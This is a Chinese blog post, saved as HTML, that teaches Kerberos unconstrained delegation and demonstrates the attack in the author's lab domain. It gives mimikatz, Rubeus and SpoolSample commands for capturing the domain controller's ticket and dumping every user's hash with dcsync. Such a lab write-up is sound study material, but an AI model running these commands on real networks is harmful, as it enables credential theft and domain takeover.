@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cnshark.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="在第一章，我的一句话同时也是第一个问题。 何为Kerberos与委派？为什么Windows域会需要Kerberos与委派？ 何为Kerberos与委派以及为什么Windows域会需要Kerberos，我一到三章已经写清楚了。 现在我要来回答我曾经所问的另外一个问题 为什么Windows域会需要委派？ 首先是现有需求，再有功能。委派即是Windows域的功能。 委派在Windows域内的功能即是，用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全-Windows域渗透-Kerberos委派（四）">
+<meta property="og:url" content="https://cnshark.top/2021/08/19/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-Windows%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%EF%BC%88%E5%9B%9B%EF%BC%89/index.html">
+<meta property="og:site_name" content="dayu&#39;s blog">
+<meta property="og:description" content="在第一章，我的一句话同时也是第一个问题。 何为Kerberos与委派？为什么Windows域会需要Kerberos与委派？ 何为Kerberos与委派以及为什么Windows域会需要Kerberos，我一到三章已经写清楚了。 现在我要来回答我曾经所问的另外一个问题 为什么Windows域会需要委派？ 首先是现有需求，再有功能。委派即是Windows域的功能。 委派在Windows域内的功能即是，用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192304174.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192315530.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819211300324.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212403043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224849851.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819232653299.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224505268.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224615219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/20210819234449.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212144884.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212511454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212922925.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347862.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347955.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819223954644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347899.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347090.png">
+<meta property="article:published_time" content="2021-08-19T15:02:15.000Z">
+<meta property="article:modified_time" content="2021-08-19T15:50:43.911Z">
+<meta property="article:author" content="dayu">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="Kerberos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192304174.png">
+
+<link rel="canonical" href="https://cnshark.top/2021/08/19/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-Windows%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%EF%BC%88%E5%9B%9B%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网安全-Windows域渗透-Kerberos委派（四） | dayu's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">dayu's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">愿一尺键盘<br>捍卫祖国尊严</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-myold">
+
+    <a href="/old/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>myold</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/icnshark" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cnshark.top/2021/08/19/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-Windows%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%EF%BC%88%E5%9B%9B%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/avatar.jpg">
+      <meta itemprop="name" content="dayu">
+      <meta itemprop="description" content="北冥有魚 其名為鯤<br>化而為鳥 其名為鵬">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dayu's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网安全-Windows域渗透-Kerberos委派（四）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-19 23:02:15 / 修改时间：23:50:43" itemprop="dateCreated datePublished" datetime="2021-08-19T23:02:15+08:00">2021-08-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="在第一章，我的一句话同时也是第一个问题。"><a href="#在第一章，我的一句话同时也是第一个问题。" class="headerlink" title="在第一章，我的一句话同时也是第一个问题。"></a>在第一章，我的一句话同时也是第一个问题。</h3><p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192304174.png"></p>
+<p>何为Kerberos与委派？为什么Windows域会需要Kerberos与委派？</p>
+<p>何为Kerberos与委派以及为什么Windows域会需要Kerberos，我一到三章已经写清楚了。</p>
+<p>现在我要来回答我曾经所问的另外一个问题</p>
+<p><strong>为什么Windows域会需要委派？</strong></p>
+<p>首先是现有需求，再有功能。委派即是Windows域的功能。</p>
+<p><strong>委派在Windows域内的功能即是，用用户的身份去访问服务。</strong></p>
+<p>即无限制的转发，B可以用从A处得到的TGT访问任意服务，其中B也可以是任意服务。</p>
+<p>那为什么不直接服务服务，再转发给用户呢？</p>
+<p><strong>因为要充分利用 Windows 系统自身提供的权限控制啊，也许有的用户有权限访问那个服务而有的用户没有权限。</strong></p>
+<p>即Windows域为什么会需要委派。</p>
+<span id="more"></span>
+
+<p>首先根据委派功能，把委派分为</p>
+<ul>
+<li>非约束委派</li>
+<li>约束委派<ul>
+<li>基于资源的约束委派</li>
+</ul>
+</li>
+</ul>
+<h4 id="首先来探讨一下非约束攻击"><a href="#首先来探讨一下非约束攻击" class="headerlink" title="首先来探讨一下非约束攻击"></a>首先来探讨一下非约束攻击</h4><p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192315530.png"></p>
+<p>流程如下：</p>
+<ol>
+<li>用户向KDC请求可转发TGT，记为TGT1</li>
+<li>KDC返回TGT1</li>
+<li>用户通过TGT1向KDC请求转发TGT2</li>
+<li>KDC返回TGT2</li>
+<li>用户通过TGT1向KDC申请访问服务1的RST</li>
+<li>KDC返回RST</li>
+<li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li>
+<li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li>
+<li>KDC给服务1返回服务2的RST</li>
+<li>服务1以用户名义向服务2发出请求</li>
+<li>服务2响应服务1的请求</li>
+<li>服务1响应用户第7步骤的请求</li>
+</ol>
+<p>这个流程有一个问题：<strong>TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</strong>攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p>
+<hr>
+<p>域环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域：dayu.com</span><br><span class="line">域控：2008r2 -2012r2dc</span><br><span class="line">域成员：win10ltsc -user0pc</span><br></pre></td></tr></table></figure>
+
+<p>dc配置主机账户的非约束委派</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819211300324.png" alt="image-20210819211300324"></p>
+<p>spooler服务默认自动运行</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212403043.png" alt="image-20210819212403043"></p>
+<hr>
+<p>win10域普通用户尝试通过ipc访问域控，权限不足。</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224849851.png"></p>
+<p>域控</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\user0pc.dayu.com\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819232653299.png" alt="image-20210819232653299"></p>
+<p>win10本地管理员抓取TGT</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224505268.png"></p>
+<p>导入tgt</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;kerberos::ptt [0;319a0e]-2-0-60a10000-Administrator@krbtgt-DAYU.COM.kirbi&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819224615219.png"></p>
+<p>通过ipc$访问域控，访问成功</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\<span class="number">2012</span>r2dc.dayu.com\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/20210819234449.png"></p>
+<p><strong>以上流程如下：</strong></p>
+<ol>
+<li>域管向KDC请求可转发TGT，记为TGT1</li>
+<li>KDC返回TGT1</li>
+<li>域管通过TGT1向KDC请求转发TGT2</li>
+<li>KDC返回TGT2</li>
+<li>域管通过TGT1向KDC申请访问win10的RST</li>
+<li>KDC返回RST</li>
+<li>域管发送RST、TGT1、TGT2和TGT2的SessionKey给win10</li>
+<li>win10通过域管的TGT2请求KDC，以域管名义请求本地ipc$的RST（服务访问票据）</li>
+<li>KDC给win10返回本地ipc$的RST</li>
+<li>win10以域管名义向本地ipc$发出请求</li>
+<li>本地ipc$响应win10的请求</li>
+<li>win10响应域管第7步骤的请求</li>
+</ol>
+<p><strong>现在win10通过本地管理员即可抓取到TGT2，即可使用TGT2冒充域管，访问任意服务。</strong></p>
+<p>现在实现了委派攻击，绕过了kerberos。</p>
+<p>上面利用非约束委派拿到域管账户TGT的前提是需要域管账户和委派主机有过交互才能获取到TGT。</p>
+<p>这一点是很致命的，触发条件太苛刻了。</p>
+<p>那么能不能在win10上让dc来通过win10访问服务呢？</p>
+<p>可以。</p>
+<hr>
+<h5 id="利用Print-Spooler服务强制触发委派"><a href="#利用Print-Spooler服务强制触发委派" class="headerlink" title="利用Print Spooler服务强制触发委派"></a>利用Print Spooler服务强制触发委派</h5><p>当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。<strong>但是这种攻击有一个限制是需要找到一台开启非受限委派的主机账户，而非服务账户并且有一个域普通账户</strong></p>
+<p>win10使用本地管理员运行，每1秒抓取来着域控的TGT</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe monitor /targetuser:<span class="number">2012</span>r2dc<span class="variable">$</span> /interval:<span class="number">1</span> /nowrap</span><br></pre></td></tr></table></figure>
+
+<p>切换到域账户运行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SpoolSample.exe <span class="number">2012</span>r2dc.dayu.com user0pc.dayu.com</span><br></pre></td></tr></table></figure>
+
+<p>切换到本地管理员，发现已抓取到票据</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212144884.png"></p>
+<p>导入票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe ptt /ticket:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212511454.png"></p>
+<p>mimikatz抓取票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819212922925.png"></p>
+<p>mimikatz导出域内所有用户的hash</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:dayu.com /all /csv&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347862.png" alt="image-20210819213258420"></p>
+<p>此时抓取到的hash为域管的hash，直接通过PTH远控域管。</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347955.png" alt="image-20210819221116259"></p>
+<p>之前导出的hash是mimikatz利用tgt从域控导出的hash，即导出的是域内全部用户的hash。</p>
+<p>实验如下：</p>
+<p>之前的</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/image-20210819223954644.png"></p>
+<p>域控添加一个新用户</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347899.png" alt="image-20210819223914603"></p>
+<p>再次导出</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108192347090.png" alt="image-20210819223954644"></p>
+<p>（之前把密码都设的一样，不知道导出的本地管理员还是域管的hash，所以我改了一下域管的密码，现在看来，这个命令是导出域内用户的hash）</p>
+<p>可以看见新增了dayu1这个用户的hash，即同步了域控的hash。</p>
+<hr>
+<h3 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h3><p>上面有几个坑，折腾了挺久的，工具得自己编译，然后win7运行会保存，装了NET也一样，域控为2008R2，不知道为啥触发不了Print Spooler服务。还有Rubeus.exe的抓取命令，国内都是搬运，没一个完整的。</p>
+<p>最近挺忙，慢慢学习，慢慢更新。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+              <a href="/tags/Kerberos/" rel="tag"># Kerberos</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-Windows%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%EF%BC%88%E4%B8%89%EF%BC%89/" rel="prev" title="内网安全-Windows域渗透-Kerberos委派（三）">
+      <i class="fa fa-chevron-left"></i> 内网安全-Windows域渗透-Kerberos委派（三）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%8C%E6%88%91%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8C%E6%97%B6%E4%B9%9F%E6%98%AF%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E3%80%82"><span class="nav-number">1.</span> <span class="nav-text">在第一章，我的一句话同时也是第一个问题。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E6%9D%A5%E6%8E%A2%E8%AE%A8%E4%B8%80%E4%B8%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.</span> <span class="nav-text">首先来探讨一下非约束攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Print-Spooler%E6%9C%8D%E5%8A%A1%E5%BC%BA%E5%88%B6%E8%A7%A6%E5%8F%91%E5%A7%94%E6%B4%BE"><span class="nav-number">1.1.1.</span> <span class="nav-text">利用Print Spooler服务强制触发委派</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">PS：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="dayu"
+      src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/avatar.jpg">
+  <p class="site-author-name" itemprop="name">dayu</p>
+  <div class="site-description" itemprop="description">北冥有魚 其名為鯤<br>化而為鳥 其名為鵬</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/icnshark" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;icnshark" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:icnshark@gmail.com" title="E-Mail → mailto:icnshark@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dayu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
